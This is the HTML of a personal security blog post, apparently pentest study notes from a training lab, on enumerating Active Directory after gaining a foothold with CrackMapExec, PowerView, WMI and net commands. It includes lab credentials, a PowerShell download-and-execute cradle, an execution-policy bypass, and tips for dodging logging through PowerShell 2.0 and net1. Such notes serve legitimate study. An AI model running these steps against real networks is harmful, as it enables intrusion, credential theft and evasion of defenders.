<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>AD CRED ENUM | OUHBOY</title>
<meta name="keywords" content="Active-Directory">
<meta name="description" content="Active Directory credential enumeration">
<meta name="author" content="Malw0re">
<link rel="canonical" href="https://malw0re.github.io/posts/active-directory/ad-credential-enumeration/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://malw0re.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://malw0re.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://malw0re.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://malw0re.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://malw0re.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="AD CRED ENUM" />
<meta property="og:description" content="Active Directory credential enumeration" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://malw0re.github.io/posts/active-directory/ad-credential-enumeration/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-08-09T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="AD CRED ENUM"/>
<meta name="twitter:description" content="Active Directory credential enumeration"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://malw0re.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "AD CRED ENUM",
      "item": "https://malw0re.github.io/posts/active-directory/ad-credential-enumeration/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "AD CRED ENUM",
  "name": "AD CRED ENUM",
  "description": "Active Directory credential enumeration",
  "keywords": [
    "Active-Directory"
  ],
  "articleBody": " Credential Enumeration After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\nDomain users Computer Attributes group membership Group Policy Objects Permissions ACLs Trusts but not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.\nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.\nCrackMapExec. This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.\nDomain UserEnum When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a badPwdCount attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users\nDomain Group Enum We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --groups\nWe can begin to note down groups of interest. Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.\nSmbmap A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content.\nrecursive list Dirs in Shares smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only\nRpcClient Used to enumerate, add, change and even remove objects from AD.\nEnumeration Relative Identifier (RID) is a unique identifier utilized to track and identify objects, for example:\nThe SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.\nWhen an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\nSo the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of S-1-5-21-3842939050-3880317879-2865463114-1111.\nThis is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\nSome accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have 500 or 0x1f4 this value is unique to an object hence we can use it to enumerate further info from the domain.\nImpacket-Toolkit impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python.\nPsexec.py A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.\nOnce comms are established it provides a shell as a SYSTEM on the victim host.\nwindapsearch Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da(enumerate domain admins group members ) option and the -PU( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.\nDomain-Admins python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\nThis enumerates Domain Admin Groups.\nPrivileged Users Checking for potential users, using -PU with elevated privileges that may have gone unnoticed.\nN/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.\npython3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\nBloodHound Once you have the domain credentials, you can run BloodHound.py a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.\nWindows At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup\nDo any trusts exist with other domains both inside \u0026 outside the current forest? Files shares that our user has access to. ActiveDirectory Powershell Modules These are groups of Powershell cmdlets for enumerating AD environments.\nGet-ADDomain - Print out domain SID, domain functional level, and child domains.\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName This will filter ACC with the serviceprincipalname property populated and also get us a listing ACC that may be susceptible to kerberos attacks.\nGet-ADTrust -Filter * - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.\nGet-ADGroup -Filter * | select name - Group enumeration\nGet-ADGroup -Identity \"Backup Operators\" - Detailed Group Info\nGet-ADGroupMember -Identity \"Backup Operators\" - Getting Group Membership\nPowerview It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.\nIt gives an insight into the security posture of the target domain.\ncommands Command Description Export-PowerViewCSV Append results to a CSV file ConvertTo-SID Convert a User or group name to its SID value Get-DomainSPNTicket Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions Get-Domain Will return the AD object for the current (or specified) domain Get-DomainController Return a list of the Domain Controllers for the specified domain Get-DomainUser Will return all users or specific user objects in AD Get-DomainComputer Will return all computers or specific computer objects in AD Get-DomainGroup Will return all groups or specific group objects in AD Get-DomainOU Search for all or specific OU objects in AD Find-InterestingDomainAcl Finds object ACLs in the domain with modification rights set to non-built in objects Get-DomainGroupMember Will return the members of a specific domain group Get-DomainFileServer Returns a list of servers likely functioning as file servers Get-DomainDFSShare Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: Get-DomainGPO Will return all GPOs or specific GPO objects in AD Get-DomainPolicy Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: Get-NetLocalGroup Enumerates local groups on the local or a remote machine Get-NetLocalGroupMember Enumerates members of a specific local group Get-NetShare Returns open shares on the local (or a remote) machine Get-NetSession Will return session information for the local (or a remote) machine Test-AdminAccess Tests if the current user has administrative access to the local (or a remote) machine Threaded ‘Meta’-Functions Find-DomainUserLocation Finds machines where specific users are logged in Find-DomainShare Finds reachable shares on domain machines Find-InterestingDomainShareFile Searches for files matching specific criteria on readable shares in the domain Find-LocalAdminAccess Find machines on the local domain where the current user has local administrator access Domain Trust Functions Get-DomainTrust Returns domain trusts for the current domain or a specified domain Get-ForestTrust Returns all forest trusts for the current forest or a specified forest Get-DomainForeignUser Enumerates users who are in groups outside of the user’s domain Get-DomainForeignGroupMember Enumerates groups with users outside of the group’s domain and returns each foreign member Get-DomainTrustMapping Will enumerate all trusts for the current domain and any others seen. Domain User Info\nGet-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\nRecursive Group Membership\nGet-DomainGroupMember -Identity \"Domain Admins\" -Recurse - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.\nTrust Enumeration.\nGet-DomainTrustMapping test for local admin access on either the current machine or the remote one.\nTesting for Local Admin Access\nTest-AdminAccess -ComputerName ACADEMY-EA-MS01\nUsers with SPN Set\nGet-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\nShares Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization.\nSnaffler A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.\nLiving off the Land Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.\nMost enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.\nEnv Enumeration Host \u0026 Network Recon Command Result hostname Prints the PC’s Name [System.Environment]::OSVersion.Version Prints out the OS version and revision level wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patches and hotfixes applied to the host ipconfig /all Prints out network adapter state and configurations set %USERDOMAIN% Displays the domain name to which the host belongs (ran from CMD-prompt) set %logonserver% Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) Powershell It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.\nCmd-Let Description Get-Module Lists available modules loaded for use. Get-ExecutionPolicy -List Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. Set-ExecutionPolicy Bypass -Scope Process This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host. Get-Content C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt With this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. Get-ChildItem Env: ft Key, Value powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘URL to download the file from’); ” This is a quick and easy way to download a file from the web using PowerShell and call it from memory. OPSec Tactics A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.\nExample Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders’ radar while utilizing resources built into the hosts to our advantage.\nChecking Defenses. These few commands will utilize the netsh and sc to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\nFirewall check - netsh advfirewall show allprofiles\nDefender check cmd - sc query windefend\nChecking the status and configuration settings - Get-MpComputerStatus\nAm I Alone? When landing on a host for the first time, it’s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.\nIf a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\nNetwork Enumeration Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 \u0026 IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall shows state Displays the status of the host’s firewall. We can determine if it is active and filtering traffic. Windows Management Instrumentation (WMI) This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.\nQuick WMI checks\nCommand Description wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list Displays information about the Domain and Domain Controllers wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list Information about all local groups wmic sysaccount list /format:list Dumps information about any system accounts that are being used as service accounts. This cheatsheet has some useful commands for querying host and domain info using wmic.\nNet Commands Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.\nCommand Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group “Domain Admins” /domain List users with domain admin privileges net group “domain computers” /domain List of PCs connected to the domain net group “Domain Controllers” /domain List PC accounts of domains controllers net group /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain Net Command Tip. If you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing net1 instead of the net to work out using the net command.\nDsquery A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.\nDsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\\Windows\\System32\\dsquery.dll\nA long read but worthy to check up on those commands one might not remember …\n",
  "wordCount" : "2540",
  "inLanguage": "en",
  "datePublished": "2023-08-09T00:00:00Z",
  "dateModified": "2023-08-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Malw0re"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://malw0re.github.io/posts/active-directory/ad-credential-enumeration/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "OUHBOY",
    "logo": {
      "@type": "ImageObject",
      "url": "https://malw0re.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://malw0re.github.io/" accesskey="h" title="OUHBOY (Alt + H)">OUHBOY</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://malw0re.github.io/posts/" title="posts">
                    <span>posts</span>
                </a>
            </li>
            <li>
                <a href="https://malw0re.github.io/about/" title="about">
                    <span>about</span>
                </a>
            </li>
            <li>
                <a href="https://malw0re.github.io/tags/" title="tags">
                    <span>tags</span>
                </a>
            </li>
            <li>
                <a href="https://malw0re.github.io/archives/" title="archives">
                    <span>archives</span>
                </a>
            </li>
            <li>
                <a href="https://malw0re.github.io/search/" title="🔍 (Alt &#43; /)" accesskey=/>
                    <span>🔍</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      AD CRED ENUM
    </h1>
    <div class="post-description">
      Active Directory credential enumeration
    </div>
    <div class="post-meta">&lt;span title=&#39;2023-08-09 00:00:00 &#43;0000 UTC&#39;&gt;August 9, 2023&lt;/span&gt;&amp;nbsp;·&amp;nbsp;12 min&amp;nbsp;·&amp;nbsp;Malw0re

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#credential-enumeration" aria-label="Credential Enumeration">Credential Enumeration</a></li>
                <li>
                    <a href="#crackmapexec" aria-label="CrackMapExec.">CrackMapExec.</a><ul>
                        
                <li>
                    <a href="#domain-userenum" aria-label="Domain UserEnum">Domain UserEnum</a></li>
                <li>
                    <a href="#domain-group-enum" aria-label="Domain Group Enum">Domain Group Enum</a></li></ul>
                </li>
                <li>
                    <a href="#smbmap" aria-label="Smbmap">Smbmap</a><ul>
                        
                <li>
                    <a href="#recursive-list-dirs-in-shares" aria-label="recursive list Dirs in Shares">recursive list Dirs in Shares</a></li></ul>
                </li>
                <li>
                    <a href="#rpcclient" aria-label="RpcClient">RpcClient</a><ul>
                        
                <li>
                    <a href="#enumeration" aria-label="Enumeration">Enumeration</a></li></ul>
                </li>
                <li>
                    <a href="#impacket-toolkit" aria-label="Impacket-Toolkit">Impacket-Toolkit</a><ul>
                        
                <li>
                    <a href="#psexecpy" aria-label="Psexec.py">Psexec.py</a></li>
                <li>
                    <a href="#windapsearch" aria-label="windapsearch">windapsearch</a></li>
                <li>
                    <a href="#domain-admins" aria-label="Domain-Admins">Domain-Admins</a></li>
                <li>
                    <a href="#privileged-users" aria-label="Privileged Users">Privileged Users</a></li></ul>
                </li>
                <li>
                    <a href="#bloodhound" aria-label="BloodHound">BloodHound</a><ul>
                        
                <li>
                    <a href="#windows" aria-label="Windows">Windows</a></li></ul>
                </li>
                <li>
                    <a href="#activedirectory-powershell-modules" aria-label="ActiveDirectory Powershell Modules">ActiveDirectory Powershell Modules</a></li>
                <li>
                    <a href="#powerview" aria-label="Powerview">Powerview</a><ul>
                        
                <li>
                    <a href="#commands" aria-label="commands">commands</a></li></ul>
                </li>
                <li>
                    <a href="#shares" aria-label="Shares">Shares</a><ul>
                        
                <li>
                    <a href="#snaffler" aria-label="Snaffler">Snaffler</a></li></ul>
                </li>
                <li>
                    <a href="#living-off-the-land" aria-label="Living off the Land">Living off the Land</a><ul>
                        
                <li>
                    <a href="#env-enumeration-host--network-recon" aria-label="Env Enumeration Host &amp;amp; Network Recon">Env Enumeration Host &amp; Network Recon</a></li></ul>
                </li>
                <li>
                    <a href="#powershell" aria-label="Powershell">Powershell</a></li>
                <li>
                    <a href="#opsec-tactics" aria-label="OPSec Tactics">OPSec Tactics</a><ul>
                        
                <li>
                    <a href="#example" aria-label="Example">Example</a></li>
                <li>
                    <a href="#checking-defenses" aria-label="Checking Defenses.">Checking Defenses.</a></li></ul>
                </li>
                <li>
                    <a href="#am-i-alone" aria-label="Am I Alone?">Am I Alone?</a><ul>
                        
                <li>
                    <a href="#network-enumeration" aria-label="Network Enumeration">Network Enumeration</a></li>
                <li>
                    <a href="#windows-management-instrumentation-wmi" aria-label="Windows Management Instrumentation (WMI)">Windows Management Instrumentation (WMI)</a></li>
                <li>
                    <a href="#net-commands" aria-label="Net Commands">Net Commands</a></li></ul>
                </li>
                <li>
                    <a href="#net-command-tip" aria-label="Net Command Tip.">Net Command Tip.</a></li>
                <li>
                    <a href="#dsquery" aria-label="Dsquery">Dsquery</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg" alt=""  />
</p>
<h2 id="credential-enumeration">Credential Enumeration<a hidden class="anchor" aria-hidden="true" href="#credential-enumeration">#</a></h2>
<p>After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:</p>
<ul>
<li>Domain users</li>
<li>Computer Attributes</li>
<li>group membership</li>
<li>Group Policy Objects</li>
<li>Permissions</li>
<li>ACLs</li>
<li>Trusts</li>
</ul>
<p>but not limited to the above, but the most <strong>important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.</strong></p>
<p>So at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.</p>
<h2 id="crackmapexec">CrackMapExec.<a hidden class="anchor" aria-hidden="true" href="#crackmapexec">#</a></h2>
<p>This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.</p>
<h3 id="domain-userenum">Domain UserEnum<a hidden class="anchor" aria-hidden="true" href="#domain-userenum">#</a></h3>
<p>When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a <strong><strong><strong><strong><strong>badPwdCount</strong></strong></strong></strong></strong> attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.</p>
<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users</code></p>
<h3 id="domain-group-enum">Domain Group Enum<a hidden class="anchor" aria-hidden="true" href="#domain-group-enum">#</a></h3>
<p>We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.</p>
<p><code>sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx</code>  <code>--groups</code></p>
<p>We can begin to note down groups of interest. Take note of key groups like <code>Administrators</code>, <code>Domain Admins</code>, <code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.</p>
<h2 id="smbmap">Smbmap<a hidden class="anchor" aria-hidden="true" href="#smbmap">#</a></h2>
<p>A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content.</p>
<h3 id="recursive-list-dirs-in-shares">recursive list Dirs in Shares<a hidden class="anchor" aria-hidden="true" href="#recursive-list-dirs-in-shares">#</a></h3>
<p><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only</code></p>
<h2 id="rpcclient">RpcClient<a hidden class="anchor" aria-hidden="true" href="#rpcclient">#</a></h2>
<p>Used to enumerate, add, change and even remove objects from AD.</p>
<h3 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">Relative Identifier (RID)</a> is a unique identifier utilized to track and identify objects, for example:</p>
<ul>
<li>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers">SID</a> for the INLANEFREIGHT.LOCAL domain is: <code>S-1-5-21-3842939050-3880317879-2865463114</code>.</p>
</li>
<li>
<p>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</p>
</li>
<li>
<p>So the domain user <code>htb-student</code> with a RID:[0x457] Hex 0x457 would = decimal <code>1111</code>, will have a full user SID of <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</p>
</li>
<li>
<p>This is unique to the <code>htb-student</code> object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.</p>
</li>
</ul>
<p>Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have <strong>500</strong> or <strong>0x1f4</strong> this value is unique to an object hence we can use it to enumerate further info from the domain.</p>
<h2 id="impacket-toolkit">Impacket-Toolkit<a hidden class="anchor" aria-hidden="true" href="#impacket-toolkit">#</a></h2>
<p>impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python.</p>
<h3 id="psexecpy">Psexec.py<a hidden class="anchor" aria-hidden="true" href="#psexecpy">#</a></h3>
<p>A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.</p>
<p>Once comms are established it provides a shell as a SYSTEM on the victim host.</p>
<h3 id="windapsearch">windapsearch<a hidden class="anchor" aria-hidden="true" href="#windapsearch">#</a></h3>
<p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a> is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The <code>--da</code>(enumerate domain admins group members ) option and the <code>-PU</code>( find privileged users) options. The <code>-PU</code> option is interesting because it will perform a recursive search for users with nested group membership.</p>
<h3 id="domain-admins">Domain-Admins<a hidden class="anchor" aria-hidden="true" href="#domain-admins">#</a></h3>
<p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></p>
<p>This enumerates Domain Admin Groups.</p>
<h3 id="privileged-users">Privileged Users<a hidden class="anchor" aria-hidden="true" href="#privileged-users">#</a></h3>
<p>Checking for potential users, using <strong>-PU</strong> with elevated privileges that may have gone unnoticed.</p>
<p><strong>N/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</strong></p>
<p><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></p>
<h2 id="bloodhound">BloodHound<a hidden class="anchor" aria-hidden="true" href="#bloodhound">#</a></h2>
<p>Once you have the domain credentials, you can run <a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a> a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.</p>
<ul>
<li>
<h3 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h3>
</li>
</ul>
<p>At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup</p>
<ul>
<li>Do any trusts exist with other domains both inside &amp; outside the current forest?</li>
<li>Files shares that our user has access to.</li>
</ul>
<h2 id="activedirectory-powershell-modules">ActiveDirectory Powershell Modules<a hidden class="anchor" aria-hidden="true" href="#activedirectory-powershell-modules">#</a></h2>
<p>These are groups of Powershell cmdlets for enumerating AD environments.</p>
<p><code>Get-ADDomain</code> - Print out domain SID, domain functional level, and child domains.</p>
<p><code>Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName</code> This will filter ACC with the <strong>serviceprincipalname</strong> property populated and also get us a listing ACC that may be susceptible to kerberos attacks.</p>
<p><code>Get-ADTrust -Filter *</code> - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.</p>
<p><code>Get-ADGroup -Filter * | select name</code> - Group enumeration</p>
<p><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code> - Detailed Group Info</p>
<p><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code> - Getting Group Membership</p>
<h2 id="powerview">Powerview<a hidden class="anchor" aria-hidden="true" href="#powerview">#</a></h2>
<p>It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.</p>
<p>It gives an insight into the security posture of the target domain.</p>
<ul>
<li>
<h3 id="commands">commands<a hidden class="anchor" aria-hidden="true" href="#commands">#</a></h3>
</li>
</ul>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Export-PowerViewCSV</td>
<td>Append results to a CSV file</td>
</tr>
<tr>
<td>ConvertTo-SID</td>
<td>Convert a User or group name to its SID value</td>
</tr>
<tr>
<td>Get-DomainSPNTicket</td>
<td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td>
</tr>
<tr>
<td><strong>Domain/LDAP Functions</strong></td>
<td></td>
</tr>
<tr>
<td>Get-Domain</td>
<td>Will return the AD object for the current (or specified) domain</td>
</tr>
<tr>
<td>Get-DomainController</td>
<td>Return a list of the Domain Controllers for the specified domain</td>
